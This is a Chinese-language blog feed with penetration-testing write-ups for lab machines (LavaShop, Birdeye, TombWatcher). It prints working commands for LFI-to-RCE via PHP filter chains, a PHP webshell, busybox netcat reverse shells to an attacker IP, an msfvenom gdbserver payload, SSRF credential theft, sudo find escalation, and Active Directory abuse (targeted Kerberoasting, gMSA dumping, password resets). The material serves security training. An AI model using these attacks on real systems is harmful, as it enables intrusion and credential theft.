 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      191l      466w     4025c http://lavashop.thl/assets/css/styles.css
200      GET       45l      105w     1539c http://lavashop.thl/index.php
301      GET        9l       28w      312c http://lavashop.thl/pages => http://lavashop.thl/pages/
301      GET        9l       28w      313c http://lavashop.thl/assets => http://lavashop.thl/assets/
301      GET        9l       28w      315c http://lavashop.thl/includes => http://lavashop.thl/includes/
200      GET       45l      105w     1539c http://lavashop.thl/
301      GET        9l       28w      320c http://lavashop.thl/assets/images => http://lavashop.thl/assets/images/
301      GET        9l       28w      317c http://lavashop.thl/assets/css => http://lavashop.thl/assets/css/
301      GET        9l       28w      321c http://lavashop.thl/includes/pages => http://lavashop.thl/includes/pages/
200      GET       19l       40w      698c http://lavashop.thl/includes/header.php
200      GET        8l       20w      424c http://lavashop.thl/includes/nav.php
200      GET        5l       27w      208c http://lavashop.thl/pages/about.php
200      GET       26l       97w     1017c http://lavashop.thl/pages/products.php
200      GET        8l       23w      246c http://lavashop.thl/includes/pages/contact.php
200      GET        4l        7w      139c http://lavashop.thl/pages/contact.php
200      GET        5l       20w      195c http://lavashop.thl/pages/home.php
200      GET        5l       14w      105c http://lavashop.thl/includes/footer.php
200      GET        6l       26w      192c http://lavashop.thl/includes/pages/catalog.php
200      GET        4l       30w      208c http://lavashop.thl/includes/pages/home.php
```

看着像是存在 LFI ，枚举一下 `index.php` 的 page 参数

```python
➜  LavaShop ffuf -u 'http://lavashop.thl/index.php?page=FUZZ' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://lavashop.thl/index.php?page=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

about                   [Status: 200, Size: 1268, Words: 140, Lines: 41, Duration: 0ms]
contact                 [Status: 200, Size: 1199, Words: 115, Lines: 40, Duration: 0ms]
home                    [Status: 200, Size: 1539, Words: 192, Lines: 45, Duration: 0ms]
products                [Status: 200, Size: 2077, Words: 296, Lines: 62, Duration: 0ms]
                        [Status: 200, Size: 1539, Words: 192, Lines: 45, Duration: 4ms]
:: Progress: [74332/74332] :: Job [1/1] :: 8333 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

没有枚举出来，再枚举一下其他页面是否存在参数

有点阴了，藏在 `products.php`

```python
➜  LavaShop ffuf -u 'http://lavashop.thl/pages/products.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt -fs 1017

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://lavashop.thl/pages/products.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1017
________________________________________________

file                    [Status: 200, Size: 2481, Words: 225, Lines: 55, Duration: 1ms]
```

成功包含

```python
➜  LavaShop curl 'http://lavashop.thl/pages/products.php?file=/etc/passwd'                
  <section style="margin-bottom:1.5rem; padding:1rem; background:rgba(0,0,0,.25); border:1px solid rgba(255,255,255,.1); border-radius:12px;">
    <p style="margin:0 0 .75rem;">Incluyendo: <code>/etc/passwd</code></p>
    <pre style="white-space:pre-wrap; overflow:auto; padding:.75rem; background:rgba(0,0,0,.35); border-radius:8px;">
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                   
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync                                                                                
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                                                   
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
Rodri:x:1001:1001::/home/Rodri:/bin/bash
```

## LFI

将用户 Rodri 拿去后台爆破

```python
LavaShop hydra -l Rodri -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.129 ssh
```

继续测试 LFI，可以使用伪协议

![image.png](/post-images/TheHackersLabsLavaShop/image2.png)

能直接读 user.txt

![image.png](/post-images/TheHackersLabsLavaShop/image3.png)

继续测试，尝试使用 https://github.com/synacktiv/php_filter_chain_generator

```python
python lfi.py --chain '<?php phpinfo();?>'
```

成功执行

![image.png](/post-images/TheHackersLabsLavaShop/image4.png)

反弹 `shell`

```python
python lfi.py --chain '<?php eval(system($_GET["x"])); ?>  '  
```

![image.png](/post-images/TheHackersLabsLavaShop/image5.png)

```python
x=busybox nc 192.168.56.5 1234 -e /bin/bash
```

![image.png](/post-images/TheHackersLabsLavaShop/image6.png)

## 提权 - Rodri

查看进程可以看到后台有个 `gdbserver`

![image.png](/post-images/TheHackersLabsLavaShop/image7.png)

网上收集了几个 payload 这个能用：

[渗透测试远程 GdbServer - HackTricks --- Pentesting Remote GdbServer - HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-remote-gdbserver.html?highlight=gdbserver#pentesting-remote-gdbserver)

```python
# Trick shared by @B1n4rySh4d0w
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf

gdb binary.elf

# Set remote debuger target
target extended-remote 192.168.56.129:1337

# Upload elf file
remote put binary.elf binary.elf

# Set remote executable file
set remote exec-file /home/Rodri/binary.elf

# Execute reverse shell executable
run

# You should get your reverse-shell
```

![image.png](/post-images/TheHackersLabsLavaShop/image8.png)

## 提权

`root` 密码藏在环境变量里面

![image.png](/post-images/TheHackersLabsLavaShop/image9.png)]]></content:encoded>
            <category>靶机</category>
            <category>TheHackerLabs</category>
            <category>Linux</category>
            <category>LFI</category>
            <category>Fuzz</category>
            <category>Gdbserver</category>
        </item>
        <item>
            <title><![CDATA[HackMyVM - Birdeye]]></title>
            <link>https://www.sunsetaction.top/2025/10/17/HackMyVMBirdeye</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/10/17/HackMyVMBirdeye</guid>
            <pubDate>Fri, 17 Oct 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Birdeye. https://hackmyvm.eu/machines/machine.php?vm=Birdeye Recon PortScan 枚举 80 端口的搜索时发的包很奇怪 看着存在 SSRF 改成 kali 的 IP 试试 存在 SSRF 并且原本后面的 URL 是：http://...]]></description>
            <content:encoded><![CDATA[
# Birdeye.

> https://hackmyvm.eu/machines/machine.php?vm=Birdeye
> 

![image.png](/post-images/HackMyVMBirdeye/image.png)

## Recon

### PortScan

```python
➜  Birdeye nmap -sT -min-rate 10000 -p- 192.168.56.127
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-17 19:45 CST
Nmap scan report for 192.168.56.127
Host is up (0.00027s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
5000/tcp open  upnp
MAC Address: 08:00:27:C2:DE:A0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.44 seconds
```

```python
➜  Birdeye nmap -sT -A -p 53,80,5000 192.168.56.127                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-17 20:02 CST
Nmap scan report for 192.168.56.127
Host is up (0.00046s latency).

PORT     STATE SERVICE VERSION
53/tcp   open  domain  ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.18-Ubuntu
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: client
|_http-cors: GET POST OPTIONS
5000/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.6.9)
|_http-title: 404 Not Found
|_http-server-header: Werkzeug/2.0.3 Python/3.6.9
MAC Address: 08:00:27:C2:DE:A0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms 192.168.56.127

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.38 seconds
```

### 枚举

80 端口的搜索时发的包很奇怪

![image.png](/post-images/HackMyVMBirdeye/image1.png)

看着存在 `SSRF`

![image.png](/post-images/HackMyVMBirdeye/image2.png)

改成 kali 的 IP 试试

![image.png](/post-images/HackMyVMBirdeye/image3.png)

存在 `SSRF`

![image.png](/post-images/HackMyVMBirdeye/image4.png)

并且原本后面的 URL 是：`http://localhost:5000/api/products/?search=""`

## SSRF

利用 SSRF 漏洞进行枚举

首先枚举内网端口

```python
➜  Birdeye ffuf -u 'http://192.168.56.127/api/fetch-url?url=http://127.0.0.1:FUZZ/' -w port -fc 500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.127/api/fetch-url?url=http://127.0.0.1:FUZZ/
 :: Wordlist         : FUZZ: /root/Desktop/HackMyVM/Birdeye/port
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 500
________________________________________________

80                      [Status: 200, Size: 288, Words: 38, Lines: 8, Duration: 106ms]
:: Progress: [10000/10000] :: Job [1/1] :: 357 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```

我们再根据原本`403` 的地址进行访问，例如：

```python
403      GET        1l        5w       32c http://192.168.56.127/admin/config
401      GET        1l        1w       25c http://192.168.56.127/admin/dashboard
```

成功包含到账户密码，并且告诉我们 `/api/fetch-url` 支持 `GET, POST, OPTIONS` 三种方法

```python
➜  Birdeye curl -i 'http://192.168.56.127/api/fetch-url?url=http://127.0.0.1/admin/config'
HTTP/1.1 200 OK
Date: Fri, 17 Oct 2025 13:32:01 GMT
Server: Werkzeug/2.0.3 Python/3.6.9
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Content-Type
Content-Type: application/json
Content-Length: 106
Access-Control-Allow-Origin: *, *
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Content-Type

{"admin_password":"SuperSecret123!","admin_user":"superadmin","login_panel_path":"/admin/panelloginpage"}
```

根据获取到内容访问后访问后台地址

![image.png](/post-images/HackMyVMBirdeye/image5.png)

我们有必要发送 POST 数据（这里看了下 WP，没想到是这样更换方法），所以接上 `curl -i 'http://192.168.56.127/api/fetch-url?url=http://localhost/admin/panelloginpage&method=POST'`

```python
➜  Birdeye curl -i 'http://192.168.56.127/api/fetch-url?url=http://localhost/admin/panelloginpage&method=POST' -H 'Content-Type: application/x-www-form-urlencoded' -d 'admin_user=superadmin&admin_password=SuperSecret123!'
HTTP/1.1 200 OK
Date: Fri, 17 Oct 2025 13:35:48 GMT
Server: Werkzeug/2.0.3 Python/3.6.9
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Content-Type
Content-Type: text/html; charset=utf-8
Content-Length: 145
Access-Control-Allow-Origin: *, *
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Content-Type
Vary: Cookie,Accept-Encoding
Set-Cookie: session=eyJhZG1pbl9hdXRoZW50aWNhdGVkIjp0cnVlfQ.aPJGNA.-3-eVxjfstKta_I4ubREsK2pnAg; Domain=192.168.1.237; Path=/

    <h2>Admin Dashboard</h2>
    <form method="post">
        <label>Command: <input name="command" type="text"></label>
        <button type="s#   
```

这样就拿到了 `Cookie` ，我们存储在 `http://192.168.56.127/admin/dashboard` 中

![image.png](/post-images/HackMyVMBirdeye/image6.png)

看样子是个命令执行的功能

![image.png](/post-images/HackMyVMBirdeye/image7.png)

进行反弹 `shell`

```python
command=busybox nc 192.168.56.5 1234 -e /bin/bash
```

## 提权 - sev

查看 sudo 权限

```python
www-data@birdeye:~/birdeye$ sudo -l
Matching Defaults entries for www-data on birdeye:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on birdeye:
    (sev) NOPASSWD: /home/sev/backup_app.sh
```

查看内容，直接给了

```python
www-data@birdeye:~/birdeye$ cat /home/sev/backup_app.sh
#!/bin/bash
/bin/bash -p
```

切换到 sev

```python
www-data@birdeye:~/birdeye$ sudo -u sev /home/sev/backup_app.sh 
sev@birdeye:~/birdeye$ 
```

## 提权 - root

```python
sev@birdeye:~/birdeye$ sudo -l
Matching Defaults entries for sev on birdeye:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sev may run the following commands on birdeye:
    (ALL) NOPASSWD: /usr/bin/find
```

结束了

```python
sev@birdeye:~/birdeye$ sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root
```

## 总结

？]]></content:encoded>
            <category>靶机</category>
            <category>HackMyVM</category>
            <category>Linux</category>
            <category>SSRF</category>
            <category>find</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - TombWatcher]]></title>
            <link>https://www.sunsetaction.top/2025/10/13/HackTheBoxSeason8 - TombWatcher</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/10/13/HackTheBoxSeason8 - TombWatcher</guid>
            <pubDate>Sun, 08 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Season8 TombWatcher https://app.hackthebox.com/machines/TombWatcher | Windows | Medium Machine Information：As is common in real life Windows pentests,...]]></description>
            <content:encoded><![CDATA[
# Season8 - TombWatcher

> https://app.hackthebox.com/machines/TombWatcher | `Windows` | `Medium`
> 

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image.png)

Machine Information：As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!

## Recon

### 端口扫描

`nmap` 端口扫描

```bash
➜  TombWatcher nmap -sT -min-rate 5000 10.10.11.72  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 12:01 CST
Nmap scan report for 10.10.11.72
Host is up (0.059s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds
```

```bash
➜  TombWatcher nmap -sT -A -p 53,80,88,135,139,389,445,464,5985 10.10.11.72                                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 12:03 CST                                                   
Nmap scan report for 10.10.11.72                         
Host is up (0.10s latency).    
                                                         
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0    
|_http-server-header: Microsoft-IIS/10.0                                                                          
| http-methods:                                                                                                   
|_  Potentially risky methods: TRACE            
|_http-title: IIS Windows Server    
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-08 07:41:39Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-06-08T07:42:31+00:00; +3h38m21s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-06-08T07:41:51
|_  start_date: N/A
|_clock-skew: mean: 3h38m20s, deviation: 0s, median: 3h38m20s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   85.41 ms  10.10.16.1
2   128.13 ms 10.10.11.72
```

访问`HTTP`，是默认页

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image1.png)

扫描了一波，没什么东西，重点应该不在这，因为给了凭据

### 凭据测试 & 服务枚举

使用 `nxc` 对凭据进行测试

```bash
➜  TombWatcher nxc smb 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
➜  TombWatcher nxc ldap 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
➜  TombWatcher nxc wmi 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb
RPC         10.10.11.72     135    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
RPC         10.10.11.72     135    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
➜  TombWatcher nxc winrm 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb
WINRM       10.10.11.72     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
WINRM       10.10.11.72     5985   DC01             [-] tombwatcher.htb\henry:H3nry_987TGV!
```

```bash
➜  TombWatcher wmiexec.py tombwatcher.htb/henry:'H3nry_987TGV!'@10.10.11.72 -dc-ip 10.10.11.72
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[-] WMI Session Error: code: 0x80041003 - WBEM_E_ACCESS_DENIED
```

`SMB` 也是没什么信息

```bash
➜  TombWatcher smbclient -L 10.10.11.72 -U tombwatcher.htb/henry%'H3nry_987TGV!'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.72 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

## 域分析 - 1

```bash
➜  TombWatcher bloodhound-python -u henry -p 'H3nry_987TGV!' -d 'tombwatcher.htb' -ns 10.10.11.72 --zip -c All -dc 'DC01.tombwatcher.htb' --dns-tcp
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.tombwatcher.htb
INFO: Found 12 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 12S
INFO: Compressing output into 20250608163651_bloodhound.zip
```

`henry` 所属组权限

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image2.png)

对`Alfred`有`writeSPN`权限

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image3.png)

我们再看一下 `Alfred` 的权限

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image4.png)

继续跟进`INFRASTRUCTURE` 组，能够读取机器`ANSIBLE_DEV`的`GMSA`密码

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image5.png)

然后 `ANSIBLE_DEV` 能够更改 `SAM` 用户密码

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image6.png)

并且 `SAM` 用户对 `JOHN`用户拥有 `genericAll`

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image7.png)

用户`John`的权限，是远程管理组的成员

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image8.png)

## 域渗透

### Kerberoasting

> https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting
> 

攻击者可以将 SPN （`ServicePrincipalName`） 添加到该帐户。一旦账户拥有 SPN，它就容易受到 `Kerberoast` 的攻击 。这种技术称为 `Targeted Kerberoasting`

工具链接：https://github.com/ShutdownRepo/targetedKerberoast

```bash
➜  targetedKerberoast python targetedKerberoast.py -v -d tombwatcher.htb --dc-ip 10.10.11.72 -u henry -p 'H3nry_987TGV!'
```

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image9.png)

使用`hashcat`进行爆破

```bash
➜  targetedKerberoast hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt 
```

得到密码 `basketball`

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image10.png)

### ReadGMSAPassword

测试`alfred`的凭据

```bash
➜  TombWatcher nxc smb 10.10.11.72 -u alfred -p 'basketball' -d tombwatcher.htb
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\alfred:basketball 
```

上边分析域的时候能知道`alfred`用户可以读取`ANSIBLE_DEV` 计算机的`GMSA`密码

工具：https://github.com/micahvandeusen/gMSADumper

```bash
➜  gMSADumper python gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::1c37d00093dc2a5f25176bf2d474afdc
ansible_dev$:aes256-cts-hmac-sha1-96:526688ad2b7ead7566b70184c518ef665cc4c0215a1d634ef5f5bcda6543b5b3
ansible_dev$:aes128-cts-hmac-sha1-96:91366223f82cd8d39b0e767f0061fd9a
```

测试`ansible_dev$`的凭据

```bash
➜  TombWatcher nxc smb 10.10.11.72 -u 'ansible_dev$' -H '1c37d00093dc2a5f25176bf2d474afdc' -d tombwatcher.htb   
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\ansible_dev$:1c37d00093dc2a5f25176bf2d474afdc 
```

### To John

`ansible_dev$` 拥有更改 `SAM`用户密码的权限

```bash
➜  TombWatcher bloodyAD -d tombwatcher.htb -u 'ansible_dev$' -p ':1c37d00093dc2a5f25176bf2d474afdc' --dc-ip 10.10.11.72 set password SAM 'Password123!'
[+] Password changed successfully!
```

测试 `SAM` 凭据

```bash
➜  TombWatcher nxc smb 10.10.11.72 -u 'SAM' -p 'Password123!' -d tombwatcher.htb
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\SAM:Password123! 
```

我们再通过`SAM`用户修改`John`用户的密码

```bash
➜  TombWatcher bloodyAD -d tombwatcher.htb -u 'SAM' -p 'Password123!' --dc-ip 10.10.11.72 set owner john sam
[!] S-1-5-21-1392491010-1358638721-2126982587-1105 is already the owner, no modification will be made

➜  TombWatcher bloodyAD -d tombwatcher.htb -u 'SAM' -p 'Password123!' --dc-ip 10.10.11.72 add genericAll john sam
[+] sam has now GenericAll on john

➜  TombWatcher bloodyAD -d tombwatcher.htb -u 'SAM' -p 'Password123!' --dc-ip 10.10.11.72 set password JOHN 'Password123!'
[+] Password changed successfully!
```

使用 `evil-winrm` 进行登录

```bash
➜  TombWatcher evil-winrm -i 10.10.11.72 -u 'JOHn' -p 'Password123!'                
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> 
```

能读取 `user.txt`

```bash
*Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
3941928223b1baf7d3a3b94a3953d597
```

## 域分析 - 2

拿到 `John` 用户后，我们再进行分析一次，寻找获得`Root`的路径

`John` 的权限

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image11.png)

这名字带`CERT`，修改`CERT_ADMIN`密码，并用其尝试使用 `certipy` 枚举漏洞

```bash
➜  TombWatcher bloodyAD -d tombwatcher.htb -u 'JOHN' -p 'Password123!' --dc-ip 10.10.11.72 set password CERT_ADMIN 'Password123!'
[+] Password changed successfully!
```

```bash
➜  TombWatcher certipy-ad find -u 'CERT_ADMIN' -p 'Password123!' -dc-ip 10.10.11.72 -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
